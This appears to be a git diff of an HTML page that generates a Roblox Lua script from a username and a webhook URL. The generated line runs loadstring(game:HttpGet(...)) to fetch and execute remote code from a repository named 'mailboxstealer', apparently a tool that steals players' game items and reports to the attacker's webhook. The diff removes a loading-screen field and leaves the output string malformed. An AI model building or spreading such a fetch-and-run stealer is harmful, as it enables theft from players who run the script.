@@ -24,8 +24,7 @@
             <br><br>
             <input placeholder="Webhook" type="text" id="webhook">
             </input>
-            <br><br>
-            <input placeholder="Loading Screen Text" type="text" id="loadscreen">
+
             
             </input>
             <br><br>
@@ -44,12 +43,11 @@
     <script>
        var nameInput = document.getElementById('username');
        var hookInput = document.getElementById('webhook');
-       var lscreenInput = document.getElementById('loadscreen');
        var scriptarea = document.getElementById('scriptarea');
        document.getElementById("submit").onclick = function() {myFunction()};
 
 function myFunction() {
-    scriptarea.innerHTML = '_G.UserName = "'+nameInput.value+'"\n_G.Webhook = "'+hookInput.value+'"\n_G.loadingScreenText = "'+lscreenInput.value+'"\nloadstring(game:HttpGet("https://raw.githubusercontent.com/DupeHub/mailboxstealer/main/script"))()'
+    scriptarea.innerHTML = 'UserName = "'+nameInput.value+'".WebHook = "'+hookInput.value+'"\nloadstring(game:HttpGet("https://raw.githubusercontent.com/DupeHub/mailboxstealer/main/script"))()'
 }
 </script>
 </body>
